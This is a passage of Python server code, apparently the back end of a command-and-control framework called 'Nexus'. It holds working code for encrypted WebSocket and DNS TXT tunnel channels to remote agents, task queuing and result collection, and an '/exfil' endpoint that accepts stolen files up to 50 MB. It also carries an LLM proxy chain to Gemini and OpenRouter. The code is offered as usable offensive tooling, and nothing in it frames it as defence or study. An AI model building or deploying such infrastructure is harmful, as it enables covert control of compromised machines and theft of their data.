        body    = await request.json()
        message = str(body.get("message", "")).strip()
        history = body.get("history", [])
        if not message:
            return web.json_response({"retry": True}, status=200)
    except Exception:
        return web.json_response({"retry": True}, status=200)

    # Historial formato OpenAI (compatible Gemini y OpenRouter)
    messages = [{"role": "system", "content": _GEMINI_SYSTEM}]
    for h in history[-10:]:
        role = "assistant" if h.get("role") in ("assistant", "model") else "user"
        messages.append({"role": role, "content": str(h.get("content", ""))})
    messages.append({"role": "user", "content": message})

    # ── Intento 1: Gemini 2.5 Flash Lite ─────────────────────────────────
    if GEMINI_API_KEY:
        contents = [
            {"role": ("model" if m["role"] == "assistant" else m["role"]),
             "parts": [{"text": m["content"]}]}
            for m in messages if m["role"] != "system"
        ]
        payload = {
            "system_instruction": {"parts": [{"text": _GEMINI_SYSTEM}]},
            "contents": contents,
            "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.7},
        }
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent?key={GEMINI_API_KEY}"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as r:
                    data = await r.json()
            if r.status == 200:
                text = data["candidates"][0]["content"]["parts"][0]["text"]
                if text:
                    return web.json_response({"response": text, "provider": "gemini"})
            log.warning("Gemini %d — pasando a cadena OpenRouter", r.status)
        except Exception as exc:
            log.warning("Gemini excepción: %s — pasando a cadena OpenRouter", exc)

    # ── Cadena de fallback OpenRouter ─────────────────────────────────────
    if OPENROUTER_API_KEY:
        for model in _OPENROUTER_CHAIN:
            try:
                text = await _call_openrouter(messages, model)
                log.info("OpenRouter OK modelo=%s", model)
                return web.json_response({"response": text, "provider": "openrouter"})
            except Exception as exc:
                log.warning("OpenRouter %s falló: %s — siguiente modelo", model, exc)

    # Todos fallaron — respuesta neutral sin alarmar
    return web.json_response({"retry": True}, status=200)


async def handle_panel(request: web.Request) -> web.Response:
    return web.Response(text=_PANEL_HTML, content_type="text/html")


# ---------------------------------------------------------------------------
# WebSocket transport handler  (GET /ws)
# ---------------------------------------------------------------------------

async def handle_ws(request: web.Request) -> web.WebSocketResponse:
    """WebSocket channel — persistent, real-time, no beacon delay."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    log.info("WS   new connection from %s", request.remote)

    sid_hex = None
    sess    = None

    async for msg in ws:
        if msg.type != aiohttp.WSMsgType.BINARY:
            continue

        data = msg.data
        if not data:
            continue

        # First frame: wire = [sid_len 1B][sid bytes][frame]
        sid_len = data[0]
        sid_raw = data[1: 1 + sid_len].decode("ascii") if sid_len else ""
        frame   = data[1 + sid_len:]

        # ── Handshake (no session yet) ────────────────────────────────────────
        if not sid_raw or sid_raw not in sessions:
            if not frame or frame[0] != 0x01:   # must be HELLO
                await ws.send_bytes(pack_clear(MSG_ERROR))
                continue
            try:
                welcome, session_id, _, chacha, srv_nonce = \
                    server_process_hello(frame, server_priv)
            except Exception as exc:
                log.error("WS HELLO error: %s", exc)
                await ws.send_bytes(pack_clear(MSG_ERROR))
                continue
            sid_hex = session_id.hex()
            sess = SessionState(session_id, chacha, srv_nonce)
            sessions[sid_hex] = sess
            log.info("WS   HELLO session=%.16s", sid_hex)
            await ws.send_bytes(welcome)
            continue

        # ── Encrypted frame ───────────────────────────────────────────────────
        sess = sessions[sid_raw]
        sid_hex = sid_raw
        try:
            msg_type, payload = parse_frame(frame, sess.chacha)
        except Exception:
            await ws.send_bytes(pack_clear(MSG_ERROR))
            continue
        try:
            sess.check_nonce(frame)
        except ValueError as exc:
            log.warning("WS REPLAY blocked session=%.8s: %s", sid_hex, exc)
            await ws.send_bytes(pack_clear(MSG_ERROR))
            continue

        resp = await _dispatch_encrypted(msg_type, payload, sess, sid_hex)
        await ws.send_bytes(resp.body)

    log.info("WS   closed session=%.16s", sid_hex or "?")
    return ws


# ---------------------------------------------------------------------------
# DNS TXT tunnel handler  (UDP port 5353)
# ---------------------------------------------------------------------------

def _dns_parse_query(data: bytes) -> tuple[bytes, bytes]:
    """Return (txid, encoded_payload) from a DNS TXT query."""
    txid = data[:2]
    pos  = 12   # skip header
    labels = []
    while pos < len(data) and data[pos] != 0:
        length = data[pos]; pos += 1
        labels.append(data[pos: pos + length].decode("ascii", errors="ignore"))
        pos += length

    # Drop the apex labels ("n", "c2"), keep data labels
    payload_labels = labels[:-2] if len(labels) > 2 else labels
    encoded = "".join(payload_labels).upper()
    padding = (8 - len(encoded) % 8) % 8
    raw = base64.b32decode(encoded + "=" * padding)
    return txid, raw


def _dns_build_txt_response(txid: bytes, query: bytes, txt: bytes) -> bytes:
    """Build a minimal DNS TXT response with txt as the record data."""
    # Header
    flags    = b"\x81\x80"   # QR=1 (response), OPCODE=0, AA=1, RD=1, RA=1
    header   = txid + flags + b"\x00\x01\x00\x01\x00\x00\x00\x00"
    # Copy question section from query (starts at byte 12)
    question = query[12:]
    # Answer RR: pointer to question name + TYPE TXT + CLASS IN + TTL 0
    # Split into ≤255-byte TXT strings (DNS limit per string)
    encoded  = base64.b32encode(txt).lower().rstrip(b"=")
    rdata    = b"".join(bytes([min(len(encoded) - i, 255)]) + encoded[i: i + 255]
                        for i in range(0, max(len(encoded), 1), 255))
    answer   = (
        b"\xc0\x0c"                         # name pointer → offset 12
        + b"\x00\x10"                        # TYPE = TXT
        + b"\x00\x01"                        # CLASS = IN
        + b"\x00\x00\x00\x00"               # TTL = 0
        + struct.pack("!H", len(rdata))      # RDLENGTH
        + rdata
    )
    return header + question + answer


class _DnsProtocol(asyncio.DatagramProtocol):
    """Asyncio UDP protocol for the DNS TXT tunnel."""

    def __init__(self):
        self._transport = None

    def connection_made(self, transport):
        self._transport = transport
        log.info("DNS  tunnel listening on UDP :%d", DNS_PORT)

    def datagram_received(self, data: bytes, addr):
        asyncio.create_task(self._handle(data, addr))

    def error_received(self, exc):
        log.error("DNS socket error: %s", exc)

    async def _handle(self, data: bytes, addr):
        try:
            txid, raw = _dns_parse_query(data)
        except Exception as exc:
            log.warning("DNS parse error from %s: %s", addr, exc)
            return

        sid_len = raw[0]
        sid_raw = raw[1: 1 + sid_len].decode("ascii", errors="ignore") if sid_len else ""
        frame   = raw[1 + sid_len:]

        if not sid_raw or sid_raw not in sessions:
            if not frame or frame[0] != 0x01:
                resp_bytes = pack_clear(MSG_ERROR)
            else:
                try:
                    welcome, session_id, _, chacha, srv_nonce = \
                        server_process_hello(frame, server_priv)
                    sid_hex = session_id.hex()
                    sessions[sid_hex] = SessionState(session_id, chacha, srv_nonce)
                    log.info("DNS  HELLO session=%.16s from %s", sid_hex, addr)
                    resp_bytes = welcome
                except Exception as exc:
                    log.error("DNS HELLO error: %s", exc)
                    resp_bytes = pack_clear(MSG_ERROR)
        else:
            sess = sessions[sid_raw]
            try:
                msg_type, payload = parse_frame(frame, sess.chacha)
                sess.check_nonce(frame)
                resp = await _dispatch_encrypted(msg_type, payload, sess, sid_raw)
                resp_bytes = resp.body
            except ValueError as exc:
                log.warning("DNS REPLAY blocked session=%.8s: %s", sid_raw[:8], exc)
                resp_bytes = pack_clear(MSG_ERROR)
            except Exception as exc:
                log.error("DNS dispatch error: %s", exc)
                resp_bytes = pack_clear(MSG_ERROR)

        dns_resp = _dns_build_txt_response(txid, data, resp_bytes)
        log.info("DNS  → %d B | ← %d B from %s", len(frame), len(resp_bytes), addr)
        self._transport.sendto(dns_resp, addr)


async def _dns_server() -> None:
    loop = asyncio.get_running_loop()
    await loop.create_datagram_endpoint(
        _DnsProtocol,
        local_addr=("0.0.0.0", DNS_PORT),
    )


# ---------------------------------------------------------------------------
# Background: offline monitor
# ---------------------------------------------------------------------------

async def _monitor_agents() -> None:
    while True:
        now = time.time()
        for data in list(agents.values()):
            if now - data["last_seen"] > 30 and data["status"] == "online":
                data["status"] = "offline"
                log.warning("OFFLINE agent_id=%.8s", data["agent_id"])
        await asyncio.sleep(5)


async def _monitor_tasks() -> None:
    """Detect inflight tasks that exceeded timeout and mark them TIMEOUT."""
    while True:
        await asyncio.sleep(15)
        now = time.time()
        for agent_id, inflight_tasks in list(inflight.items()):
            for task_id, info in list(inflight_tasks.items()):
                deadline = info["dispatched_at"] + info["timeout_s"] + 10  # 10s grace
                if now > deadline:
                    del inflight_tasks[task_id]
                    if agent_id in agents:
                        agents[agent_id]["inflight_tasks"] = len(inflight_tasks)
                    log.warning("TIMEOUT task_id=%.8s agent_id=%.8s", task_id, agent_id)
                    bucket = results.setdefault(agent_id, [])
                    bucket.append({
                        "agent_id":  agent_id,
                        "task_id":   task_id,
                        "exit_code": -1,
                        "stdout":    "",
                        "stderr":    f"TIMEOUT — sin respuesta en {info['timeout_s']}s",
                        "ts":        int(now),
                    })
                    if len(bucket) > MAX_RESULTS:
                        del bucket[0]


async def _cleanup_sessions() -> None:
    """Evict sessions idle longer than SESSION_TTL to prevent memory leak."""
    while True:
        await asyncio.sleep(60)
        cutoff = time.time() - SESSION_TTL
        stale  = [sid for sid, s in sessions.items() if s.last_seen < cutoff]
        for sid in stale:
            del sessions[sid]
        if stale:
            log.info("evicted %d stale sessions", len(stale))


async def _on_startup(app: web.Application) -> None:
    global server_priv
    try:
        server_priv = load_server_key(SERVER_KEY_FILE)
        log.info("server key loaded from %s", SERVER_KEY_FILE)
    except FileNotFoundError:
        server_priv, _ = generate_server_keypair()
        save_server_key(server_priv, SERVER_KEY_FILE)
        log.info("server key generated")
    pub = get_pub_bytes(server_priv)
    try:
        with open(SERVER_PUB_FILE, "w") as f:
            f.write(pub.hex())
    except OSError as exc:
        raise RuntimeError(
            f"Cannot write {SERVER_PUB_FILE}: {exc}. Agents cannot obtain the server public key."
        ) from exc
    if not OPERATOR_API_KEY:
        log.warning("NEXUS_API_KEY not set — operator API is unauthenticated")
    log.info("server pub=%s", pub.hex())
    asyncio.create_task(_monitor_agents())
    asyncio.create_task(_monitor_tasks())
    asyncio.create_task(_cleanup_sessions())
    asyncio.create_task(_dns_server())


# ---------------------------------------------------------------------------
# App factory
# ---------------------------------------------------------------------------

def build_app() -> web.Application:
    app = web.Application(
        middlewares=[_operator_auth],
        client_max_size=50 * 1024 * 1024,  # 50 MB (exfil de archivos)
    )
    app.router.add_get("/",                           handle_panel)
    app.router.add_post("/",                         handle_nexus)
    app.router.add_get("/ws",                        handle_ws)
    app.router.add_get("/agents",                    api_list_agents)
    app.router.add_post("/agents/{agent_id}/task",   api_enqueue_task)
    app.router.add_get("/agents/{agent_id}/results", api_get_results)
    app.router.add_post("/exfil",                    api_exfil_receive)
    app.router.add_get("/exfil",                     api_exfil_list)
    app.router.add_get("/geo",                       api_geo)
    app.router.add_post("/ai",                       api_gemini_proxy)
    app.on_startup.append(_on_startup)
    return app
